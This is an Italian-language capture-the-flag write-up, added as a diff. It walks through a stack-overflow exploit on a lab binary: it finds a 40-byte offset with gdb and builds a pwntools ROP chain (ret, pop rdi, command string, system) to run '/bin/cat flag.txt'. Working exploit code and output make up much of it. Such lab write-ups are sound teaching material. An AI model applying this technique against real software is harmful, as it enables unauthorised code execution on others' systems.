@@ -1,0 +1,34 @@
+Eseguo un attacco ROP Chain, in modo tale da chiamare system("/bin/cat flag.txt").
+
+1) Come prima cosa, devo individuare l'offset necessario per sovrascrivere l'indirizzo di ritorno.
+2) Avvio il gdb e digito pattern_create 300 pat_300.
+3) Questo comando genera un pattern unico lungo 300 caratteri e lo salva in un file.
+4) Eseguo run < pat_300 per iniettare il pattern.
+5) Digito il comando pattern_search e visualizzo l'offset: 40.
+6) Inizio a comporre il payload aggiungendo 40 caratteri 'A'.
+7) Per sovrascrivere l'indirizzo di ritorno, costruisco una catena di gadget ROP.
+8) Scrivo uno script python per creare la catena ROP.
+9) Aggiungo un padding per allineare lo stack (se necessario).
+
+if padding:
+    rop.raw(rop.ret)
+
+10) Imposto il registro rdi da utilizzare come parametro per la funzione system.
+
+command = next(elf.search(b"/bin/cat flag.txt"))
+rop(rdi=command)
+
+11) Aggiungo la chiamata alla funzione system.
+
+rop.raw(elf.symbols["system"])
+
+12) Ottengo la seguente catena ROP:
+
+0x0000:         0x40053e ret
+0x0008:         0x4007c3 pop rdi; ret
+0x0010:         0x601060 usefulString
+0x0018:         0x400560 system
+
+13) Aggiungo la catena ROP al payload ed eseguo lo script.
+
+Flag: ROPE{a_placeholder_32byte_flag!}
